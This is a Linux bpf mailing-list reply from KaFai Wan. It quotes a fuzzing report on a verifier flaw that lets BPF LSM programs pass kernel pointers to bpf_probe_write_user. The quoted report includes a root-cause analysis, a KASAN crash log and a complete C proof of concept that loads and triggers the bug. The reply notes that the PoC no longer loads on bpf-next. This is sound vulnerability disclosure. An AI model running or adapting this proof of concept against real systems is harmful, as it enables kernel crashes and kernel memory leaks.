Received: from out-183.mta1.migadu.com (out-183.mta1.migadu.com [95.215.58.183])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D343E3EB7F1
	for <bpf@vger.kernel.org>; Wed, 22 Apr 2026 13:15:02 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=95.215.58.183
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1776863705; cv=none; b=Lylq9E+bhA6W+tzPzsANqGRuYK2PjOOT+3MQP7LQmVTXte+Ay59TtxWH6zqy2sZdxTGGurxDm86giFm7LhNnJWmKESf2VbWGI/faeBS5hgmlPsqYDE+H/EGOSlvlg13yiWHDDPRGeETWpuQYvWEkqUic0upqAjXxsE6d+T9GKW4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1776863705; c=relaxed/simple;
	bh=MCemvfVxP9KTAgoPYa/fBwPc5CjWzzbCdosvXL2SFZA=;
	h=Message-ID:Subject:From:To:Cc:Date:In-Reply-To:References:
	 Content-Type:MIME-Version; b=bguv1nalxmcsT/VL76Ly/3sr2nULY3Y75uRpoE4h/3m7bK69EXLI6DmFop5n5lLd39dMN33B6CgzaJkPTwqh/1JS5iuASMFsoDUyJRlxwuQzoKtE/vAlTC0G1mjmt2zKyo4mODTdo795KqCocITJnbGWrid0QA+EwAWUy00uFV4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev; spf=pass smtp.mailfrom=linux.dev; dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b=Imk/kWyv; arc=none smtp.client-ip=95.215.58.183
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.dev
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b="Imk/kWyv"
Message-ID: <c362a2f1b2752c1588d682ab54389da132c1d105.camel@linux.dev>
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=linux.dev; s=key1;
	t=1776863701;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
	 content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references;
	bh=MCemvfVxP9KTAgoPYa/fBwPc5CjWzzbCdosvXL2SFZA=;
	b=Imk/kWyvxZ8T4SaRXk+2s1UXiZhpAlhPmE6DvCKPPeNnKzNhb1t3uwIJFeHbF3N8KlaAqg
	rwVJvC18Ed8ZYL0C/tXFNLd/pT+UOkTkzw7WzWjhpSf6IpqQqrTjZ7ROpd3DznBpkpJtCM
	iz0Yep3Wfuj7LRPFsMXe7fbfn1ZvJMU=
Subject: Re: Out-of-Bounds Read / Null-Pointer Dereference in
 bpf_probe_write_user via PTR_TO_BTF_ID
X-Report-Abuse: Please report any abuse attempt to abuse@migadu.com and include these headers.
From: KaFai Wan <kafai.wan@linux.dev>
To: Quan Sun <2022090917019@std.uestc.edu.cn>, daniel@iogearbox.net, 
	bpf@vger.kernel.org
Cc: dddddd@hust.edu.cn, M202472210@hust.edu.cn, dzm91@hust.edu.cn, 
 hust-os-kernel-patches@googlegroups.com, ast@kernel.org, andrii@kernel.org,
  jiayuan.chen@linux.dev
Date: Wed, 22 Apr 2026 21:14:10 +0800
In-Reply-To: <2586af4d-eb02-4406-8535-3078515aa56a@std.uestc.edu.cn>
References: <2586af4d-eb02-4406-8535-3078515aa56a@std.uestc.edu.cn>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
X-Migadu-Flow: FLOW_OUT

On Tue, 2026-04-21 at 22:48 +0800, Quan Sun wrote:
> Our fuzzing found an Out-of-Bounds Read / Null-Pointer Dereference=20
> vulnerability in the Linux kernel BPF subsystem. The issue is triggered=
=20
> when a `BPF_PROG_TYPE_LSM` program calls the `bpf_probe_write_user`=20
> helper with a `PTR_TO_BTF_ID` (such as `struct file *`) as the source=20
> argument. The verifier incorrectly allows this pointer type, causing the=
=20
> kernel to treat it as a valid source memory buffer and dereference it=20
> during the memory copy, potentially leaking kernel memory to user space=
=20
> or causing a crash.
>=20
> Reported-by: Quan Sun <2022090917019@std.uestc.edu.cn>
> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
>=20
> ## Root Cause
>=20
> This vulnerability is caused by an over-permissive type check in the=20
> eBPF verifier regarding the `bpf_probe_write_user` helper.
>=20
> 1. A program is loaded as `BPF_PROG_TYPE_LSM` and attached via BTF to a=
=20
> security hook, such as `bpf_lsm_mmap_file`. The arguments provided by=20
> the context to this hook (e.g., `struct file *`) are marked by the=20
> verifier as `PTR_TO_BTF_ID | PTR_TRUSTED`.
> 2. The BPF program invokes the `bpf_probe_write_user(dst, src, len)`=20
> helper. This helper is intended to write data from a BPF space buffer=20
> (`src`) to a user space address (`dst`). The expected type for `src` is=
=20
> `ARG_PTR_TO_MEM | MEM_RDONLY`.
> 3. In `kernel/bpf/verifier.c`, the compatible register types for=20
> `ARG_PTR_TO_MEM` incorrectly include `PTR_TO_BTF_ID`. While this is safe=
=20
> for helpers that only read data internally within the kernel,=20
> `bpf_probe_write_user` specifically exports this data to user space.
> 4. The BPF program passes the trusted kernel pointer directly to=20
> `bpf_probe_write_user`.
> 5. The helper proceeds to call `copy_to_user_nofault`, copying the raw=
=20
> kernel memory directly to the user-provided `dst` address.
> 6. If the pointer passed to the hook is `NULL` (which happens in=20
> `security_mmap_file` when mapping anonymous memory) and an offset is=20
> applied to bypass the verifier's struct size bounds check,=20
> `copy_to_user_nofault` attempts to read from a near-NULL invalid address=
=20
> (e.g., `0x48`), resulting in a Null-Pointer Dereference and a KASAN=20
> crash. Even with a valid pointer, this allows arbitrary kernel=20
> structures to be leaked to user space.
>=20
> #### Execution Flow Visualization
>=20
> ```text
> Vulnerability Execution Flow
> >=20
> > --- 1. `bpf(BPF_PROG_LOAD, ...)` loads LSM program
> > =C2=A0=C2=A0 |
> > =C2=A0=C2=A0 `-- Program type: `BPF_PROG_TYPE_LSM`
> > =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 Calls `bpf_probe_write_user(user_d=
st, kernel_ptr, len)`
> >=20
> > --- 2. Program attachment via BTF
> > =C2=A0=C2=A0 |
> > =C2=A0=C2=A0 `-- Attach to target function: `bpf_lsm_mmap_file`
> >=20
> > --- 3. User triggers `mmap()` (anonymous mapping)
> > =C2=A0=C2=A0 |
> > =C2=A0=C2=A0 `-- `ksys_mmap_pgoff` -> `vm_mmap_pgoff` -> `security_mmap=
_file`
> > =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 |
> > =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 |-- Calls the BPF LSM hook, passin=
g `file` pointer (which is=20
> NULL for anon mmap)
> >=20
> > --- 4. BPF LSM program executes
> > =C2=A0=C2=A0 |
> > =C2=A0=C2=A0 `-- Program invokes `bpf_probe_write_user(user_buf, file +=
 72, 8)`
> >=20
> > --- 5. `bpf_probe_write_user` executes
> > =C2=A0=C2=A0 |
> > =C2=A0=C2=A0 `-- Calls `copy_to_user_nofault(user_buf, NULL + 72, 8)`
> > =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 |
> > =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 `-> KASAN detects invalid access a=
t address 0x48 -> Crash!
> ```
>=20
> ## Reproduction Steps
>=20
> 1. Load an LSM BPF program that:
> =C2=A0=C2=A0=C2=A0 - Takes a pointer argument from the context (e.g., `st=
ruct file *`).
> =C2=A0=C2=A0=C2=A0 - Applies an offset to this pointer to bypass the veri=
fier's struct=20
> boundary checks.
> =C2=A0=C2=A0=C2=A0 - Calls `bpf_probe_write_user` using the manipulated k=
ernel pointer=20
> as the `src` argument.
> 2. Attach the program to the valid BTF function id for=20
> `bpf_lsm_mmap_file` obtained from the kernel image.
> 3. Trigger the hook from user space by calling anonymous `mmap()`, which=
=20
> causes the kernel to pass a `NULL` file pointer to the LSM hook.
> 4. The execution of the helper will attempt to read from the=20
> out-of-bounds/NULL offset, causing the kernel to crash and triggering KAS=
AN.
>=20
> ## KASAN Report
>=20
> ```text
> [=C2=A0 222.421612][ T9884]=20
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> [=C2=A0 222.422598][ T9884] BUG: KASAN: null-ptr-deref in=20
> copy_to_user_nofault+0x13a/0x1d0
> [=C2=A0 222.423552][ T9884] Read of size 8 at addr 0000000000000048 by ta=
sk=20
> poc/9884
> [=C2=A0 222.424433][ T9884]
> [=C2=A0 222.424735][ T9884] CPU: 0 UID: 0 PID: 9884 Comm: poc Not tainted=
=20
> 7.0.0-rc5-g6f6c794d0ff0 #5 PREEMPT(f
> [=C2=A0 222.424755][ T9884] Hardware name: QEMU Standard PC (i440FX + PII=
X,=20
> 1996), BIOS 1.15.0-1 04/01/2014
> [=C2=A0 222.424765][ T9884] Call Trace:
> [=C2=A0 222.424771][ T9884]=C2=A0 <TASK>
> [=C2=A0 222.424777][ T9884]=C2=A0 dump_stack_lvl+0x116/0x1b0
> [=C2=A0 222.424804][ T9884]=C2=A0 ? copy_to_user_nofault+0x13a/0x1d0
> [=C2=A0 222.424822][ T9884]=C2=A0 kasan_report+0xca/0x100
> [=C2=A0 222.424850][ T9884]=C2=A0 ? copy_to_user_nofault+0x13a/0x1d0
> [=C2=A0 222.424872][ T9884]=C2=A0 kasan_check_range+0x39/0x1c0
> [=C2=A0 222.424891][ T9884]=C2=A0 copy_to_user_nofault+0x13a/0x1d0
> [=C2=A0 222.424911][ T9884]=C2=A0 bpf_probe_write_user+0xaf/0xf0
> [=C2=A0 222.424931][ T9884]=C2=A0 bpf_prog_b58fbe7e0c2ee32e+0x2f/0x38
> [=C2=A0 222.424948][ T9884]=C2=A0 bpf_trampoline_6442657058+0x64/0x10d
> [=C2=A0 222.424965][ T9884]=C2=A0 security_mmap_file+0x8b1/0x9f0
> [=C2=A0 222.424985][ T9884]=C2=A0 vm_mmap_pgoff+0xd9/0x460
> [=C2=A0 222.425011][ T9884]=C2=A0 ? __pfx_vm_mmap_pgoff+0x10/0x10
> [=C2=A0 222.425034][ T9884]=C2=A0 ? __pfx_vfs_write+0x10/0x10
> [=C2=A0 222.425064][ T9884]=C2=A0 ksys_mmap_pgoff+0xde/0x640
> [=C2=A0 222.425091][ T9884]=C2=A0 ? __pfx_ksys_mmap_pgoff+0x10/0x10
> [=C2=A0 222.425116][ T9884]=C2=A0 ? ksys_write+0x1a8/0x240
> [=C2=A0 222.425131][ T9884]=C2=A0 ? __pfx_ksys_write+0x10/0x10
> [=C2=A0 222.425148][ T9884]=C2=A0 __x64_sys_mmap+0x12c/0x190
> [=C2=A0 222.425177][ T9884]=C2=A0 do_syscall_64+0x11b/0xf80
> [=C2=A0 222.425205][ T9884]=C2=A0 entry_SYSCALL_64_after_hwframe+0x77/0x7=
f
> [=C2=A0 222.425223][ T9884] RIP: 0033:0x7f996ace8963
> [=C2=A0 222.425236][ T9884] Code: ef e8 d1 b4 ff ff eb e7 e8 4a 68 01 00 =
66=20
> 2e 0f 1f 84 00 00 00 00 00 41 89 c7
> [=C2=A0 222.425252][ T9884] RSP: 002b:00007ffd372e3678 EFLAGS: 00000246=
=20
> ORIG_RAX: 0000000000000009
> [=C2=A0 222.425269][ T9884] RAX: ffffffffffffffda RBX: 00007ffd372f3918 R=
CX:=20
> 00007f996ace8963
> [=C2=A0 222.425281][ T9884] RDX: 0000000000000001 RSI: 0000000000001000 R=
DI:=20
> 0000000000000000
> [=C2=A0 222.425291][ T9884] RBP: 00007ffd372f37f0 R08: 00000000ffffffff R=
09:=20
> 0000000000000000
> [=C2=A0 222.425301][ T9884] R10: 0000000000000022 R11: 0000000000000246 R=
12:=20
> 0000000000000000
> [=C2=A0 222.425311][ T9884] R13: 00007ffd372f3928 R14: 0000556343783dd8 R=
15:=20
> 00007f996ae08020
> [=C2=A0 222.425332][ T9884]=C2=A0 </TASK>
> [=C2=A0 222.425338][ T9884]=20
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> [=C2=A0 222.449121][ T9884] Kernel panic - not syncing: KASAN: panic_on_w=
arn=20
> set ...
> [=C2=A0 222.449739][ T9884] CPU: 0 UID: 0 PID: 9884 Comm: poc Not tainted=
=20
> 7.0.0-rc5-g6f6c794d0ff0 #5 PREEMPT(f
> [=C2=A0 222.450576][ T9884] Hardware name: QEMU Standard PC (i440FX + PII=
X,=20
> 1996), BIOS 1.15.0-1 04/01/2014
> [=C2=A0 222.451633][ T9884] Call Trace:
> [=C2=A0 222.452048][ T9884]=C2=A0 <TASK>
> [=C2=A0 222.452419][ T9884]=C2=A0 dump_stack_lvl+0x3d/0x1b0
> [=C2=A0 222.452993][ T9884]=C2=A0 vpanic+0x7f7/0xa80
> [=C2=A0 222.453496][ T9884]=C2=A0 ? __pfx_vpanic+0x10/0x10
> [=C2=A0 222.454058][ T9884]=C2=A0 panic+0xc7/0xd0
> [=C2=A0 222.454521][ T9884]=C2=A0 ? __pfx_panic+0x10/0x10
> [=C2=A0 222.455078][ T9884]=C2=A0 ? preempt_schedule_common+0x44/0xb0
> [=C2=A0 222.455742][ T9884]=C2=A0 ? copy_to_user_nofault+0x13a/0x1d0
> [=C2=A0 222.456399][ T9884]=C2=A0 ? preempt_schedule_thunk+0x16/0x30
> [=C2=A0 222.457056][ T9884]=C2=A0 ? check_panic_on_warn+0x24/0xc0
> [=C2=A0 222.457672][ T9884]=C2=A0 ? copy_to_user_nofault+0x13a/0x1d0
> [=C2=A0 222.458329][ T9884]=C2=A0 check_panic_on_warn+0xb6/0xc0
> [=C2=A0 222.458934][ T9884]=C2=A0 ? copy_to_user_nofault+0x13a/0x1d0
> [=C2=A0 222.459473][ T9884]=C2=A0 end_report+0x142/0x190
> [=C2=A0 222.460003][ T9884]=C2=A0 ? copy_to_user_nofault+0x13a/0x1d0
> [=C2=A0 222.460668][ T9884]=C2=A0 kasan_report+0xd8/0x100
> [=C2=A0 222.461236][ T9884]=C2=A0 ? copy_to_user_nofault+0x13a/0x1d0
> [=C2=A0 222.461909][ T9884]=C2=A0 kasan_check_range+0x39/0x1c0
> [=C2=A0 222.462484][ T9884]=C2=A0 copy_to_user_nofault+0x13a/0x1d0
> [=C2=A0 222.463125][ T9884]=C2=A0 bpf_probe_write_user+0xaf/0xf0
> [=C2=A0 222.463733][ T9884]=C2=A0 bpf_prog_b58fbe7e0c2ee32e+0x2f/0x38
> [=C2=A0 222.464405][ T9884]=C2=A0 bpf_trampoline_6442657058+0x64/0x10d
> [=C2=A0 222.465076][ T9884]=C2=A0 security_mmap_file+0x8b1/0x9f0
> [=C2=A0 222.465693][ T9884]=C2=A0 vm_mmap_pgoff+0xd9/0x460
> [=C2=A0 222.466279][ T9884]=C2=A0 ? __pfx_vm_mmap_pgoff+0x10/0x10
> [=C2=A0 222.466910][ T9884]=C2=A0 ? __pfx_vfs_write+0x10/0x10
> [=C2=A0 222.467519][ T9884]=C2=A0 ksys_mmap_pgoff+0xde/0x640
> [=C2=A0 222.468103][ T9884]=C2=A0 ? __pfx_ksys_mmap_pgoff+0x10/0x10
> [=C2=A0 222.468754][ T9884]=C2=A0 ? ksys_write+0x1a8/0x240
> [=C2=A0 222.469323][ T9884]=C2=A0 ? __pfx_ksys_write+0x10/0x10
> [=C2=A0 222.469926][ T9884]=C2=A0 __x64_sys_mmap+0x12c/0x190
> [=C2=A0 222.470530][ T9884]=C2=A0 do_syscall_64+0x11b/0xf80
> [=C2=A0 222.471120][ T9884]=C2=A0 entry_SYSCALL_64_after_hwframe+0x77/0x7=
f
> [=C2=A0 222.471855][ T9884] RIP: 0033:0x7f996ace8963
> [=C2=A0 222.472382][ T9884] Code: ef e8 d1 b4 ff ff eb e7 e8 4a 68 01 00 =
66=20
> 2e 0f 1f 84 00 00 00 00 00 41 89 c7
> [=C2=A0 222.474703][ T9884] RSP: 002b:00007ffd372e3678 EFLAGS: 00000246=
=20
> ORIG_RAX: 0000000000000009
> [=C2=A0 222.475716][ T9884] RAX: ffffffffffffffda RBX: 00007ffd372f3918 R=
CX:=20
> 00007f996ace8963
> [=C2=A0 222.476651][ T9884] RDX: 0000000000000001 RSI: 0000000000001000 R=
DI:=20
> 0000000000000000
> [=C2=A0 222.477602][ T9884] RBP: 00007ffd372f37f0 R08: 00000000ffffffff R=
09:=20
> 0000000000000000
> [=C2=A0 222.478555][ T9884] R10: 0000000000000022 R11: 0000000000000246 R=
12:=20
> 0000000000000000
> [=C2=A0 222.479487][ T9884] R13: 00007ffd372f3928 R14: 0000556343783dd8 R=
15:=20
> 00007f996ae08020
> [=C2=A0 222.480452][ T9884]=C2=A0 </TASK>
> [=C2=A0 222.480897][ T9884] Kernel Offset: disabled
> [=C2=A0 222.481434][ T9884] Rebooting in 86400 seconds..
> ```
>=20
> ## Proof of Concept
>=20
> The following C program demonstrates the vulnerability on the latest=20
> bpf-next (commit 6f6c794d0ff05dab1fa4677f39043de8a6a80da3):
>=20
> ### How BTF_ID is obtained
>=20
> To find the BTF ID for `bpf_lsm_mmap_file`, you can use `bpftool`:
>=20
> ```bash
> bpftool btf dump file /path/to/vmlinux | grep "FUNC 'bpf_lsm_mmap_file'"
> ```
>=20
> Example output:
> ```text
> [XXXXX] FUNC 'bpf_lsm_mmap_file' type_id=3DYYYYY linkage=3Dstatic
> ```
>=20
> ```c
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <stdint.h>
> #include <unistd.h>
> #include <fcntl.h>
> #include <sys/syscall.h>
> #include <sys/mman.h>
> #include <string.h>
> #include <linux/bpf.h>
>=20
> #define BTF_ID_MMAP_FILE 206275 // bpf_lsm_mmap_file
>=20
> void execute_one() {
> =C2=A0=C2=A0=C2=A0=C2=A0 struct bpf_insn insns[] =3D {
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 { 0xbf, 6, 1, 0, 0 },=C2=
=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 // R6 =3D R1 (ctx)
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 { 0x79, 2, 6, 0, 0 },=C2=
=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 // R2 =3D *(u64*)(R6 + 0)
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 { 0x07, 2, 0, 0, 72 },=
=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 // R2 +=3D 72 (f_op offset)
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 { 0x18, 1, 0, 0, 0x20000=
000 },
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 { 0x00, 0, 0, 0, 0x00000=
000 },
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 { 0xb7, 3, 0, 0, 8 },
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 { 0x85, 0, 0, 0, 36 },=
=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 // call bpf_probe_write_us=
er
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 { 0xb7, 0, 0, 0, 0 },
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 { 0x95, 0, 0, 0, 0 }
> =C2=A0=C2=A0=C2=A0=C2=A0 };
>=20
The insns failed to load with the latest bpf-next tree, may fix in commit=
=20
94e948b7e684 ("bpf: annotate file argument as __nullable in bpf_lsm_mmap_fi=
le").

> =C2=A0=C2=A0=C2=A0=C2=A0 char log_buf[65536];
> =C2=A0=C2=A0=C2=A0=C2=A0 union bpf_attr attr;
> =C2=A0=C2=A0=C2=A0=C2=A0 memset(&attr, 0, sizeof(attr));
> =C2=A0=C2=A0=C2=A0=C2=A0 attr.prog_type =3D 29;
> =C2=A0=C2=A0=C2=A0=C2=A0 attr.insns =3D (uint64_t)insns;
> =C2=A0=C2=A0=C2=A0=C2=A0 attr.insn_cnt =3D sizeof(insns) / sizeof(struct =
bpf_insn);
> =C2=A0=C2=A0=C2=A0=C2=A0 attr.license =3D (uint64_t)"GPL";
> =C2=A0=C2=A0=C2=A0=C2=A0 attr.expected_attach_type =3D 27;
> =C2=A0=C2=A0=C2=A0=C2=A0 attr.attach_btf_id =3D BTF_ID_MMAP_FILE;
> =C2=A0=C2=A0=C2=A0=C2=A0 attr.log_buf =3D (uint64_t)log_buf;
> =C2=A0=C2=A0=C2=A0=C2=A0 attr.log_size =3D sizeof(log_buf);
> =C2=A0=C2=A0=C2=A0=C2=A0 attr.log_level =3D 2;
>=20
> =C2=A0=C2=A0=C2=A0=C2=A0 int prog_fd =3D syscall(__NR_bpf, BPF_PROG_LOAD,=
 &attr, sizeof(attr));
> =C2=A0=C2=A0=C2=A0=C2=A0 if (prog_fd < 0) {
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 perror("BPF_PROG_LOAD");
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 printf("Log: %s\n", log_=
buf);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 return;
> =C2=A0=C2=A0=C2=A0=C2=A0 }
> =C2=A0=C2=A0=C2=A0=C2=A0 printf("Prog loaded: %d\n", prog_fd);
>=20
> =C2=A0=C2=A0=C2=A0=C2=A0 union bpf_attr link_attr;
> =C2=A0=C2=A0=C2=A0=C2=A0 memset(&link_attr, 0, sizeof(link_attr));
> =C2=A0=C2=A0=C2=A0=C2=A0 link_attr.link_create.prog_fd =3D prog_fd;
> =C2=A0=C2=A0=C2=A0=C2=A0 link_attr.link_create.attach_type =3D 27;
> =C2=A0=C2=A0=C2=A0=C2=A0 int link_fd =3D syscall(__NR_bpf, BPF_LINK_CREAT=
E, &link_attr,=20
> sizeof(link_attr));
> =C2=A0=C2=A0=C2=A0=C2=A0 if (link_fd < 0) {
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 perror("BPF_LINK_CREATE"=
);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0 return;
> =C2=A0=C2=A0=C2=A0=C2=A0 }
> =C2=A0=C2=A0=C2=A0=C2=A0 printf("Link created: %d\n", link_fd);
>=20
> =C2=A0=C2=A0=C2=A0=C2=A0 mmap(NULL, 4096, PROT_READ, MAP_PRIVATE | MAP_AN=
ONYMOUS, -1, 0);
> }
>=20
> int main() {
> =C2=A0=C2=A0=C2=A0=C2=A0 mmap((void *)0x20000000, 0x1000, PROT_READ | PRO=
T_WRITE,=20
> MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
> =C2=A0=C2=A0=C2=A0=C2=A0 execute_one();
> =C2=A0=C2=A0=C2=A0=C2=A0 return 0;
> }
> ```
> ## Kernel Configuration Requirements for Reproduction
>=20
> The vulnerability can be triggered with the kernel config in the attachme=
nt.

--=20
Thanks,
KaFai
